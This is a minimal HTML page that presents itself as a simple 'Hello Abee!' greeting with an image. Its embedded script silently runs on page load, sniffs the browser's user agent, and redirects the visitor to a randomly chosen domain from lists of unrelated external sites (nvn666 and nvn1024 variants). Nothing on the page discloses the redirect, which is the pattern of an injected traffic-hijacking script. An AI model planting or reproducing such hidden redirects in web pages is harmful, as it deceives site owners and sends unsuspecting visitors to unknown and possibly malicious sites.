<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Abee</title>
</head>
<body>
<h1 style="text-align: center">Hello Abee!</h1>
<div style="text-align: center">
    <img src="abee.jpg">
</div>
</body>
<script>
    $(document)['ready'](function () {
        var urls = ["https://www.nvn666.club", "https://www.nvn666.me", "https://www.nvn666.live", "https://www.nvn666.xyz", "https://www.nvn8.xyz"];
        var rand_h5_url = urls[Math.floor(Math.random() * urls.length)];

        var pc_urls = ["https://www.1024.com", "https://www.nvn1024.net", "https://www.nvn1024.top"];
        var rand_pc_url = pc_urls[Math.floor(Math.random() * pc_urls.length)];

        var browser={
            versions:function(){
                var u = navigator.userAgent, app = navigator.appVersion;
                return {//移动终端浏览器版本信息
                    trident: u.indexOf('Trident') > -1, //IE内核
                    presto: u.indexOf('Presto') > -1, //opera内核
                    webKit: u.indexOf('AppleWebKit') > -1, //苹果、谷歌内核
                    gecko: u.indexOf('Gecko') > -1 && u.indexOf('KHTML') == -1, //火狐内核
                    mobile: !!u.match(/AppleWebKit.*Mobile.*/), //是否为移动终端
                    ios: !!u.match(/\(i[^;]+;( U;)? CPU.+Mac OS X/), //ios终端
                    android: u.indexOf('Android') > -1 || u.indexOf('Linux') > -1, //android终端或者uc浏览器
                    iPhone: u.indexOf('iPhone') > -1 , //是否为iPhone或者QQHD浏览器
                    iPad: u.indexOf('iPad') > -1, //是否iPad
                    webApp: u.indexOf('Safari') == -1, //是否web应该程序，没有头部与底部
                    weixin: u.indexOf('MicroMessenger') > -1, //是否微信
                    qq: u.match(/\sQQ/i) == " qq" //是否QQ
                };
            }(),
            language:(navigator.browserLanguage || navigator.language).toLowerCase()
        }

        if(browser.versions.trident || browser.versions.presto || browser.versions.webKit ||
            browser.versions.gecko){
            //PC端
            window.location = rand_pc_url;
        }else{
            //移动端
            window.location = rand_h5_url;
        }
    })
</script>
</html>
